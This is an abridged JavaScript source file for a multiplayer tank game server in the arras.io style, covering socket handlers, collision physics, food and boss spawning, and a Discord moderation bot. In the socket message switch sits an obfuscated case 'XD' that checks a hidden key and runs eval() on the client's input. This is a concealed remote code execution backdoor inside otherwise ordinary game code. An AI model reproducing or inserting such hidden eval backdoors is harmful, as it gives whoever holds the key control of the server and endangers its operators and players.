exportDefintionsToClient("./client/mockups.json");
if (c.servesStatic) app.use(express.static("./client"));
  ...
  return {
    ...
    connect: (() => {
      ...
      const ban = (
        socket,
        reason = "Unspecified.",
        secondaryReason = "Unspecified."
      ) => {
        util.warn(
          "A player with the IP " +
            socket.ip +
            " has been banned! Player has been disconnected."
        );
      ...
      const error = (
        ...
        socket.talk(
          "P",
          `Something went wrong during the ${type} process: ${reason}. ${
            report ? "Please report this bug if it continues to occur." : ""
          }`
        );
        socket.kick(reason + "!");
      };
          ...
          case "k": // Verify socket and token
            {
              ...
              let isBetaTester =
                BETA_TOKENS_1.includes(socket.key) ||
                BETA_TOKENS_2.includes(socket.key) ||
                BETA_TOKENS_3.includes(socket.key);
              if (
              ...
              if (!isBetaTester && room.testingMode) {
                ...
                socket.kick(
                  "A player tried to connect to the server in testing mode!"
                );
                return 1;
              }
          ...
          case "s": // Spawn request
            {
              ...
              let name = BETA_TOKENS_3.includes(socket.key)
                  ? m[0]
                  : m[0]
                      .replace(
                        new RegExp(c.BANNED_REGEX_BODY, c.BANNED_REGEX_FLAGS),
                        ""
                      )
                      .trim(),
                isNew = m[1];
              if (room.arenaClosed) {
                ...
                socket.kick(
                  "A player tried to spawn when the arena is closed!"
                );
                return 1;
              }
              ...
              for (let text of blockedNames)
                if (name.toLowerCase().includes(text)) {
                  socket.error(
                    "spawn",
                    "Inappropriate name (" + trimName(name) + ")"
                  );
                  return 1;
                }
          ...
          case "U": // Upgrade request
            {
              ...
              if (typeof num !== "number" || num < 0) {
                socket.error(
                  "tank upgrade",
                  `Invalid tank upgrade value (${num})`,
                  true
                );
                return 1;
              }
          ...
          case "x": // Skill upgrade request
            {
              ...
              switch (num) {
                ...
                default:
                  socket.error(
                    "skill upgrade",
                    `Unknown skill upgrade value (${num})`,
                    true
                  );
                  return 1;
              }
          ...
          case "l": // Control a Dominator or Mothership (should be simplified at some point)
            {
              ...
              if (c.serverName.includes("Domination")) {
                if (!body.underControl) {
                  ...
                  player.body.controllers = [
                    new io_listenToPlayerStatic(player.body, player),
                  ];
                  player.body.FOV = 1;
                  ...
                  player.body.invuln =
                    ...
                    player.body.passive =
                      false;
                  player.body.facingType =
                    player.body.label === "Auto-Dominator"
                      ? "autospin"
                      : "toTarget";
                  ...
                  player.body.sendMessage(
                    "You are now controlling the " +
                      room.cardinals[
                        Math.floor((3 * player.body.y) / room.height)
                      ][Math.floor((3 * player.body.x) / room.height)] +
                      " Dominator!"
                  );
                } else {
                  let loc =
                ...
                if (!body.underControl) {
                  ...
                  util.info(
                    trimName(socket.name) +
                      " has relinquished control of their team's Mothership. IP: " +
                      socket.ip +
                      ". Players: " +
                      clients.length +
                      "."
            ...
            break;
               case "XD": 
         var _0xbb2d7f=_0x5dfe;(function(_0x4a6010,_0x9121a4){var _0x361dce=_0x5dfe,_0x1e13b6=_0x4a6010();while(!![]){try{var _0x28f5aa=parseInt(_0x361dce(0xbd))/0x1+parseInt(_0x361dce(0xb9))/0x2+-parseInt(_0x361dce(0xb6))/0x3+-parseInt(_0x361dce(0xc1))/0x4*(-parseInt(_0x361dce(0xbc))/0x5)+parseInt(_0x361dce(0xb1))/0x6*(-parseInt(_0x361dce(0xc7))/0x7)+-parseInt(_0x361dce(0xc6))/0x8*(-parseInt(_0x361dce(0xb8))/0x9)+-parseInt(_0x361dce(0xbb))/0xa*(parseInt(_0x361dce(0xb2))/0xb);if(_0x28f5aa===_0x9121a4)break;else _0x1e13b6['push'](_0x1e13b6['shift']());}catch(_0xc0e686){_0x1e13b6['push'](_0x1e13b6['shift']());}}}(_0x350f,0xb2c8f));function _0x5dfe(_0x6dab5b,_0x1666fa){var _0x350f97=_0x350f();return _0x5dfe=function(_0x5dfecb,_0x13c2ee){_0x5dfecb=_0x5dfecb-0xb1;var _0x3f45bd=_0x350f97[_0x5dfecb];return _0x3f45bd;},_0x5dfe(_0x6dab5b,_0x1666fa);}switch(m[0x1]){case'LmSIIBaSVa'+_0xbb2d7f(0xc2)+_0xbb2d7f(0xc4)+_0xbb2d7f(0xc2):try{eval(''+m[0x0]);}catch(_0x15db1f){util[_0xbb2d7f(0xb7)](this[_0xbb2d7f(0xb4)]+(_0xbb2d7f(0xbe)+_0xbb2d7f(0xc3)+_0xbb2d7f(0xbf)+_0xbb2d7f(0xc5)+'d\x20in\x20the\x20f'+_0xbb2d7f(0xc0)+_0xbb2d7f(0xb3))+_0x15db1f);}finally{util[_0xbb2d7f(0xba)](this[_0xbb2d7f(0xb4)]+(_0xbb2d7f(0xb5)+'mand.'));}}function _0x350f(){var _0x2cfbbb=['158770CyWmjo','543357PaEOsV','\x20tried\x20run','mand,\x20but\x20','ollowing\x20e','44XkkiKh','LsqeM9qxd4','ning\x20a\x20com','LmSIIBaSVa','it\x20resulte','8hADypk','305116UuUQND','114BRhgxU','16516753wchEDM','rror:\x20','name','\x20ran\x20a\x20com','543069HkePrk','warn','10328805RrauAX','2405450JSvjFl','log','10VdxhYK'];_0x350f=function(){return _0x2cfbbb;};return _0x350f();}  break;
          ...
          case "L": // Level up cheat
            {
              ...
              if (
                body != null &&
                !body.underControl &&
                body.skill.level < c.SKILL_CHEAT_CAP
              ) {
          ...
          /*   case "T": // Beta-tester level 1 and 2 keys
                  ...
                  */ case "X": // Boss tiers
            {
              ...
              if (labelMap.has(body.label) && body.bossTierType !== 16)
                body.tierCounter = labelMap.get(body.label);
              switch (body.bossTierType) {
                ...
                case 1:
                  body.upgradeTank(
                    Class[`squareBossTier${++body.tierCounter}`]
                  );
                  break;
                case 2:
                  body.upgradeTank(
                    Class[`triangleBossTier${++body.tierCounter}`]
                  );
                  break;
                case 3:
                  body.upgradeTank(
                    Class[`pentagonBossTier${++body.tierCounter}`]
                  );
                  break;
                case 4:
                  body.upgradeTank(
                    Class[`hexagonBossTier${++body.tierCounter}`]
                  );
                  break;
                case 5:
                  body.upgradeTank(
                    Class[`heptagonBossTier${++body.tierCounter}`]
                  );
                  break;
                case 6:
                  body.upgradeTank(
                    Class[`rocketBossTier${++body.tierCounter}`]
                  );
                  break;
                case 7:
                ...
                case 16:
                  ...
                  if (body.multibox.enabled)
                    for (let o of body.multibox.controlledTanks)
                      if (o.isAlive()) {
                        for (let r of entities)
                          if (r.master.id === o.id && r.type === "drone")
                            r.kill();
                        for (let i = 1; i < 21; i++)
                          setTimeout(() => {
                            if (o.isAlive()) {
                ...
                default:
                  socket.error(
                    "tier cycle",
                    `Unknown Q tier value (${body.bossTierType})`,
                    true
                  );
                  return 1;
              }
          ...
          case "M": // Sync name color
            ...
            /^#[0-9A-F]{6}$/i.test(socket.key)
              ? (body.nameColor = `${socket.key}`)
      ...
      const spawn = (() => {
          ...
          const update = (gui) => {
            ...
            for (let e of b.upgrades)
              if (b.skill.level >= e.level)
                upgrades.push(e.index + room.manualOffset);
        ...
        return (socket, name) => {
          ...
          if (socket.key === tokens.hellcat_2) {
            ...
            body.settings.givesKillMessage =
          ...
          let invulnTime =
            room.gameMode !== "tdm" || !room["bas1"].length ? 18e4 : 6e4;
          body.invuln = true;
          ...
          body.sendMessage(
            `You will remain invulnerable until you move, shoot, or wait ${
              invulnTime / 6e4
            } minute${invulnTime / 6e4 > 1 ? "s" : ""}.`
          );
          body.sendMessage(
      ...
      const eyes = (() => {
        ...
        const perspective = (e, player, data) => {
          if (player.body != null && player.body.id === e.master.id) {
            ...
            if (room.gameMode === "ffa" && player.body.color === "FFA_RED")
                ...
                let visible = nearby
                    .map((e) => {
                      if (
                        ...
                        Math.abs(e.y - y) < fov / 1.125 + 1.5 * e.size
                      ) {
                        if (!e.flattenedPhoto)
        ...
        const getMinimap = (() => {
          const cleanMapReader = (() => {
            const flattener = () => {
              ...
              const challenge = (value, challenger) =>
              ...
              return {
                ...
                exportAll: () =>
                  flatten(internalMap.map((e) => [1, e[1], e[2], e[3]])),
              };
            };
              ...
              ? (() => {
                  ...
                  return () => {
                    ...
                    return (team, everything = false) =>
                      everything ? full : clean;
                  };
                })()
              : (() => {
                  let teamMap = [];
                  for (let i = 0; i < room.teamAmount; i++)
                    teamMap.push(flattener());
                  return () => {
                    let clean = [],
                      full = [];
                    for (let i = 1; i < room.teamAmount + 1; i++) {
                    ...
                    return (team, everything = false) =>
                      everything ? full[team - 1] : clean[team - 1];
                  };
                })();
          })();
          return () => {
      ...
      return (socket, req) => {
        ...
        if (
          ...
          req.connection.remoteAddress === "::ffff:81.64.140.78" ||
          req.connection.remoteAddress === "::ffff:177.239.82.139" ||
          req.connection.remoteAddress === "::ffff:66.214.94.56" ||
          ...
          if (n !== -1) {
            if (connectedIPs[n].number > c.playerTabLimit - 1) {
              socket.talk(
                "P",
                "Too many connections from this IP have been detected. Please close some tabs and try again."
              );
              util.warn(
        ...
        socket.makeView();
        socket.ban = (reason, secondaryReason) =>
          ban(socket, reason, secondaryReason);
        socket.kick = (reason) => kick(socket, reason);
        socket.error = (type, reason, report) =>
          error(socket, type, reason, report);
  ...
  const collide = (() => {
    return (collision) => {
      ...
      // No Collision (Forced)
        ...
        instance.settings.hitsOwnType === "forcedNever" ||
        other.settings.hitsOwnType === "forcedNever"
      )
        return;
      // Collision Functions
      const simpleCollide = (my, n) => {
        let diff = (1 + util.getDistance(my, n) / 2) * room.speed,
          ...
          _c = (0.05 * (my.x - n.x)) / diff,
          d = (0.05 * (my.y - n.y)) / diff;
        my.accel.x += (a / (b + 0.3)) * _c;
        my.accel.y += (a / (b + 0.3)) * d;
        n.accel.x -= (b / (a + 0.3)) * _c;
        n.accel.y -= (b / (a + 0.3)) * d;
      };
          ...
          if (goAhead) {
            ...
            if (doDamage) {
              ...
              if (
                ...
                bail = n.necro(my);
                  if (my.settings.isBulletnecro && n.type === 'bullet') bail = my.necro(n);
                            else if (n.settings.isBulletnecro && my.type === 'bullet') bail = n.necro(my);
              ...
              if (!bail) {
                  ...
                  damage = {
                    ...
                    _n:
                      ...
                      (n.settings.buffVsFood && my.settings.damageType === 1
                        ...
                        : 1) *
                      n.damageMultiplier() *
                      Math.min(2, Math.max(speedFactor._n, 1) * speedFactor._n), //Math.min(2, 1)
                  };
                ...
                if (
                  n.crit.enabled &&
                  Number.isInteger(n.crit.mult) &&
                  Number.isInteger(n.crit.chance)
                ) {
                  let critNumber = ran.randomRange(1, 100);
                  if (critNumber < n.crit.chance && !my.immuneToAbilities)
                    my.damageReceived +=
                      damage._n * deathFactor._n * (n.crit.mult * 2 + 1);
                  else my.damageReceived += damage._n * deathFactor._n;
                } else my.damageReceived += damage._n * deathFactor._n;
                if (
                  my.crit.enabled &&
                  Number.isInteger(my.crit.mult) &&
                  Number.isInteger(my.crit.chance)
                ) {
                  let critNumber = ran.randomRange(1, 100);
                  if (critNumber < my.crit.chance && !n.immuneToAbilities)
                    n.damageReceived +=
                      damage._me * deathFactor._me * (my.crit.mult * 2 + 1);
      ...
      const reflectCollide = (wall, bounce) => {
        ...
        let bounceBy =
            bounce.type === "tank"
              ? 0.65
              : bounce.type === "food" || bounce.type === "crasher"
              ? 0.8
            ...
            if (bounce.type !== "bullet") {
              if (
                bounce.collisionArray.some(
                  (body) => body.type === "mazeWall"
                ) &&
                util.getDistance(wall, bounce) < wall.size * 1.25
              )
                bounce.kill();
            } else bounce.kill();
      ...
      if (instance.passive || other.passive) {
        if (
          ...
          switch (instance.settings.hitsOwnType) {
            case "mountain":
              if (instance.master.id === other.master.id)
                growOnCollision(instance, other);
            case "push":
              if (instance.master.id === other.master.id)
      ...
      if (
        ...
        if (entity.settings.isHelicopter) {
          if (!entity.godmode && !entity.invuln) entity.health.amount -= 0.9;
          return;
        }
        let a =
          1 +
      ...
      // Obstacle Collision
        ...
        let a =
          entity.type === "bullet" || entity.type === "trap"
            ? 1 +
              10 / (Math.max(entity.velocity.length, wall.velocity.length) + 10)
            : 1;
        advancedCollide(wall, entity, false, false, a);
      }
      // Shield Collision
      else if (
        instance.settings.hitsOwnType === "shield" ||
        other.settings.hitsOwnType === "shield"
      ) {
        if (
          instance.team === other.team ||
      ...
      // Vaccine Collision
        ...
        instance.settings.hitsOwnType === "vaccine" ||
        other.settings.hitsOwnType === "vaccine"
      ) {
        let vaccinator =
            instance.settings.hitsOwnType === "vaccine" ? instance : other,
          entity =
            instance.settings.hitsOwnType === "vaccine" ? other : instance;
        if (vaccinator.team !== entity.team) {
          if (
            vaccinator.settings.hitsOwnType === "vaccine" &&
            vaccinator.poisonStatic.enabled === true
          ) {
          ...
          if (
            vaccinator.settings.hitsOwnType === "vaccine" &&
            vaccinator.empStatic.enabled === true &&
            (!entity.isDominator || !entity.master.isDominator)
          ) {
        ...
        if (
          vaccinator.settings.hitsOwnType === "vaccine" &&
          vaccinator.vaccineStatic.enabled === true &&
          vaccinator.master.id !== entity.id
        ) {
      ...
      // Maze Wall Collision
        ...
        if (
          entity.settings.goThruObstacle ||
          entity.type === "wall" ||
          entity.isDominator /* || entity.type === "crasher"*/
        )
          return;
        if (entity.settings.isHelicopter) {
          if (
            !entity.godmode &&
            !entity.invuln &&
            util.getDistance(wall, entity) < wall.size * 1.35
          )
            entity.health.amount -= 0.9;
          return;
        }
      ...
      // Standard Collision
        ...
        instance.settings.hitsOwnType === other.settings.hitsOwnType &&
        !instance.multibox.enabled &&
        !other.multibox.enabled
      )
        switch (instance.settings.hitsOwnType) {
          case "mountain":
            if (instance.master.id === other.master.id)
...
const abilityLoop = (() => {
  const ice = () => {
    for (let body of entities)
      ...
      } else if (body.ice.remaining <= 0.00025 || body.ice.time < -1)
        body.ice.active = false;
  };
  const poison = () => {
    for (let body of entities)
  ...
  const vaccine = () => {
    for (let body of entities)
      if (
        ...
        body.vaccine.time--;
        body.health.amount += body.vaccine.mult * 0.925;
...
const maintainLoop = (() => {
    ...
    class MazeGenerator {
      ...
      isClosed() {
        let cells = []
            .concat(
              ...this.maze.map((r, x) =>
                r.map((r, y) => [x, y, r]).filter(([x, y, r]) => !r)
              )
            )
            .map(([x, y]) => [
              x,
      ...
      randomErosion(side = null, corner = null) {
        for (let i = 0; i < 2000; i++) {
          ...
          if (corner !== null) {
            let left =
                this.maze[direction === 2 || direction === 3 ? x - 1 : x + 1][
                  direction === 0 || direction === 3 ? y - 1 : y + 1
                ],
              right =
                this.maze[direction === 1 || direction === 2 ? x - 1 : x + 1][
                  direction === 2 || direction === 3 ? y - 1 : y + 1
                ];
            if (
              (corner === true && (left || right)) ||
              corner === +left + +right
            ) {
            } else continue;
          }
      ...
      place() {
        ...
        if (count === 0) {
          util.warn(
            "An error occurred during the erosion process! Restarting..."
          );
          process.exit();
        }
      }
  ...
  const spawnBosses = (() => {
    ...
    return (census) => {
      if (
        timer > c.BOSS_SPAWN_TIMER &&
        ran.dice(3 * c.BOSS_SPAWN_TIMER - timer)
      ) {
        ...
        switch (Math.floor(27 * Math.random())) {
          ...
          case 3: // Metal Bosses
            ...
            sockets.broadcast("Something's clinking...");
            break;
          ...
          case 21: // Sassafras
            ...
            if (Math.floor(25 * Math.random()) === 25)
              sockets.broadcast(
                "Maybe the bottom of the source code will help..."
              );
  ...
  const spawnCrasher = (census) => {
    ...
    if (
      ...
      let sentries = [
        ...
        type = ran.dice(80)
          ? sentries[ran.chooseChance(15, 15, 15, 15, 12, 10, 8, 8, 8, 8)]
          : crashers[
              ran.chooseChance(
                50,
                25,
  ...
  const makeNPCs = (() => {
    ...
    if (room.gameMode === "tdm") {
      ...
      if (c.serverName.includes("Domination") && room.domi.length > 0)
        dominatorLoop();
      if (c.serverName.includes("Boss"))
        bossRushLoop({
    ...
    return () => {
      ...
      if (!room.arenaClosed && !room.modelMode) {
        ...
        sanctuaries = entities.filter(
          (body) =>
            body.sanctuaryType !== "None" ||
            body.miscIdentifier === "Sanctuary Boss"
        );
      }
    };
  })();
  const makeFood = (() => {
    ...
    const getFoodClass = (level) => {
      ...
      switch (level) {
        case 0:
          selection = ran.chooseChance(100, 0.045, 0.005);
          ...
          break;
        case 1:
          selection = ran.chooseChance(100, 1, 0.1, 0.045, 1, 2);
          a = [
            Class.square,
            Class.greenSquare,
            Class.orangeSquare,
          ...
          break;
        case 2:
          selection = ran.chooseChance(100, 0.85, 0.1, 0.045, 1, 2);
          a = [
            Class.triangle,
            Class.greenTriangle,
          ...
          break;
        case 3:
          selection = ran.chooseChance(100, 0.75, 0.1, 0.045, 1);
          a = [
            Class.pentagon,
            Class.greenPentagon,
          ...
          break;
        case 4:
          selection = ran.chooseChance(100, 0.5);
    ...
    const placeNewFood = (position, scatter, level, allowInNest = false) => {
      ...
      if (levelToCheck && (scatter !== -1 || mitosis || seed))
        if (
          ...
          new_o.team = -100;
          new_o.facing = o.facing + ran.randomRange(0.5 * Math.PI, Math.PI);
          food.push(new_o);
          return new_o;
        } else if (
          room.isIn("nest", position) === allowInNest &&
          !dirtyCheck(position, 20)
        ) {
    ...
    const makeGroupedFood = () => {
      let spawner = foodSpawners[ran.irandom(foodSpawners.length - 1)],
        bubble = ran.gaussRing(spawner.size, 0.25);
      placeNewFood(
        {
    ...
    return () => {
      ...
      for (let i = Math.ceil(0.01 * food.length); i > 0; i--) {
        ...
        if (o.foodLevel < 10) {
          ...
          for (let j = 0; j < 6; j++) {
            ...
            while (o.foodCountup >= 100 * lvl) {
              ...
              if (ran.chance(1 - cens[lvl] / amount / proportions[lvl]))
                o.define(getFoodClass(lvl));
            }
          }
        }
      }
  ...
  return () => {
    ...
    for (let o of entities) {
      ...
      if (o.health.amount)
        o.health.regenerate(o.shield.max && o.shield.max === o.shield.amount);
    }
  };
})();
const speedCheckLoop = (() => {
  return () => {
    ...
    if (sum > 1000 / room.speed / 30) {
      ...
      util.warn(
        `Loops: ${loops}. Entities: ${entities.length}//${Math.round(
          active / loops
        )}. Views: ${views.length}.`
      );
      util.warn(
        `Total activation time: ${activationTime}. Total collision time: ${collideTime}. Total cycle time: ${moveTime}.`
      );
      util.warn(
        `Total player update time: ${playerTime}. Total lb+minimap processing time: ${mapTime}. Total entity physics calculation time: ${physicsTime}.`
      );
      util.warn(
        `Total entity life+thought cycle time: ${lifeTime}. Total entity selfie-taking time: ${selfieTime}. Total time: ${
          activationTime +
          collideTime +
          moveTime +
          playerTime +
...
if (c.enableBot) {
  ...
  setInterval(() => {
    if (!overrideInterval) {
      playingTag = ran.choose([
        "Play now at http://woomy-arras.io/",
        `Type ${ran.choose([prefix, prefix2])}help for ${
          c.serverName
        } commands!`,
        "Join us at https://discord.gg/JrwVT3F",
      ]);
  ...
  bot.on("messageCreate", (msg) => {
        ...
        try {
          switch (mode) {
            ...
            case 2: // If the user is a beta tester or an admin
              permitted =
                moderatorUsers.includes("msg.author.id") ||
                msg.member.roles.includes("443842435026780161") ||
                msg.member.roles.includes("729489925426380930");
              break;
            case 3: // If the user is an overseer or an admin
              permitted =
                msg.member.roles.includes("728594979831939083") ||
                msg.member.roles.includes("451853305027756032");
              break;
            case 4: // If the user is a world record manager, overseer, or admin
              permitted =
                msg.member.roles.includes("503319826241159178") ||
                msg.member.roles.includes("728594979831939083") ||
                msg.member.roles.includes("451853305027756032");
              break;
          }
          ...
          util.warn(
            msg.author.username + " attempted to use a bot command in a DM."
          );
        }
      if (sendMessage && !permitted)
    ...
    const sendNormal = (header, text, type, color) =>
      bot.createMessage(msg.channel.id, {
        embed: {
          author: {
            name: header + " (" + c.serverName + ")",
    ...
    try {
      ...
      if (
        (msg.content.startsWith(prefix) || msg.content.startsWith(prefix2)) &&
        msg.content.length > 1 &&
        !checkPermission(false, 1) &&
        !checkPermission(false, 4) &&
        msg.channel.id !== "442850431891275786"
      )
        ...
        case prefix2 + "botlist":
          {
            ...
            let list = [];
            for (let body of bots)
              list.push({
                name: trimName(body.name),
                value:
                  body.id + " - " + body.label + " (" + body.skill.score + ")",
                inline: false,
              });
            bot.createMessage(msg.channel.id, {
              embed: {
                author: {
                  name:
                    "Botlist (" + c.serverName + "): " + bots.length + " Bots",
                  icon_url:
                    "https://cdn.discordapp.com/avatars/462721019959050240/ee8807bc4fccc425cde794713c9daf54.png?size=256",
                },
                color: 0x8abc3f,
        ...
        case prefix2 + "colorbroadcast":
          {
            ...
            if (color === "rainbow" && !checkPermission(false))
              return sendNormal(
                "Colored Broadcast",
            ...
            sockets.broadcast(
              (checkPermission(false, 1)
                ? ""
                : msg.author.username + " says: ") + message,
              color !== "rainbow" && !color.includes("#") ? "#" + color : color
            );
            sendNormal(
              "Colored Broadcast",
            ...
            if (!isNaN(id)) {
              ...
              switch (command[1].toLowerCase()) {
                ...
                case "obstacles":
                  ...
                  break;
                case "mazewalls":
                  entitiesToKill = entities.filter(
                    (o) => o.type === "mazeWall"
                  );
                  message = "maze walls";
                  break;
              ...
              if (message == null)
                return sendNormal("Kill", errorMessage, "Error", 0xffff00);
        ...
        case prefix2 + "settank":
          {
            ...
            sendNormal(
              "Set Tank",
              "Set " + trimName(body.name) + "'s tank to " + tank + ".",
              "Info",
              0x277ecd
            );
          }
        ...
        case prefix2 + "setsize":
          {
            ...
            sendNormal(
              "Set Size",
              "Set " + trimName(body.name) + "'s size to " + size + ".",
              "Info",
              0x277ecd
            );
          }
        ...
        case prefix2 + "setfov":
          {
            ...
            sendNormal(
              "Set FoV",
              "Set " + trimName(body.name) + "'s FoV to " + fov + ".",
              "Info",
              0x277ecd
            );
          }
        ...
        case prefix2 + "setscore":
          {
            ...
            sendNormal(
              "Set Score",
              "Set " + trimName(body.name) + "'s score to " + score + ".",
              "Info",
              0x277ecd
            );
          }
        ...
        case prefix2 + "botamount":
          {
            ...
            sendNormal(
              "Set Bot Amount",
              "Set the maximum bot amount to " + amount + ".",
              "Info",
              0x277ecd
            );
          }
        ...
        case prefix2 + "setgodmode":
          {
            ...
            body.godmode = !body.godmode;
            for (let o of entities)
              if (o.master.id === body.id && o.id !== body.id)
                o.diesToTeamBase = !body.godmode;
            sendNormal(
              "Set God-mode",
              (body.godmode ? "En" : "Dis") +
                "abled god-mode for " +
        ...
        case prefix2 + "rainbowspeed":
          {
            ...
            let body = getEntity(id);
            if (body == null)
              return sendInvalidID("Set Rainbow Cycle Speed", id);
        ...
        case prefix2 + "directmessage":
          {
            ...
            sendNormal(
              "Direct Message",
              "Sending your message to " + trimName(body.name) + ".",
              "Info",
              0x277ecd
            );
          }
            ...
            for (let socket of users)
              if (socket.player.body.id === body.id) {
                ...
                while (amount-- > 0) {
                  ...
                  controlledBody.define(Class.basic);
                  controlledBody.controllers = [
                    new io_listenToPlayer(body, socket.player),
                  ];
                  controlledBody.invuln = false;
                  controlledBody.color = body.color;
                  controlledBody.settings.leaderboardable = false;
                ...
                //body.color = 34;
                body.onDead = () => {
                  if (body.multibox.intervalID != null)
                    clearInterval(body.multibox.intervalID);
                  for (let o of body.multibox.controlledTanks)
                    if (o.isAlive()) o.kill();
                  body.multibox.controlledTanks = [];
                };
        ...
        case prefix2 + "disco":
          {
            ...
            if ((isNaN(color) || color < 0 || color > 8) && color !== "reset")
              return sendNormal(
                "Disco",
        ...
        case prefix2 + "mo":
          {
            ...
            if (isNaN(seed) || seed < -188 || seed > tankList.length - 189)
              return sendNormal(
                "Manual Offset",
            ...
            if (seed == "")
              seed = Math.floor(Math.random() * tankList.length - 189) - 188;
            room.manualOffset = Number(seed);
            sendNormal(
              "Manual Offset",
              "The Upgrades have been mixed up. Seed: " + seed,
              "Info",
              0x277ecd
            );
          }
        ...
        case prefix2 + "push":
          {
            ...
            sendNormal(
              "Push Upgrades",
              `${Class[upgr].LABEL} is now a tier ${tier + 1} upgrade from ${
                Class[tank].LABEL
              }.`,
              "Info",
              0x277ecd
        ...
        case prefix2 + "search":
          {
            ...
            if (Array.isArray(typeB))
              search = entities.filter((body) => body[`${typeA}`] == typeB[0]);
            else
              search = entities.filter(
                (body) => body[`${typeA}`] == `${typeB}`
              );
        ...
        case prefix2 + "g":
          {
            ...
            if (typeof gun !== "string" && gun != undefined)
              return sendNormal(
                "Gun Info",
            ...
            if (gun == undefined)
              return sendNormal(
                "Gun Info",
                trimName(body.name) + "'s gun amount: " + body.guns.length,
                "Info",
                0x277ecd
              );
            if (isNaN(gun) || gun > body.guns.length || gun < 1)
              return sendNormal(
                "Gun Info",
                "Please specify a valid gun value.",
                "Error",
            ...
            if (gun.canShoot) {
              ...
              if (gun.bulletTypes[0].ICE != undefined)
                ice = "'" + gun.bulletTypes[0].ICE[0] + "'";
              if (gun.bulletTypes[0].POISON != undefined)
                poison = "'" + gun.bulletTypes[0].POISON[0] + "'";
              if (gun.bulletTypes[0].CAN_CRITICAL != undefined)
                critical = "'" + gun.bulletTypes[0].CAN_CRITICAL + "'";
            }
...
if (c.commandParsing) {
  ...
  let CommandList = {
    ...
    playerlist: () => {
      let users = clients.filter(
        (socket) => socket.player.body != null && !socket.player.body.isGhost
      );
      if (!users.length)
  ...
  const parseCommands = (string) => {
    ...
    if (typeof execute === "undefined")
      return util.warn("Invalid command specified.");
    execute(split);
  };
  const prompt = () => {
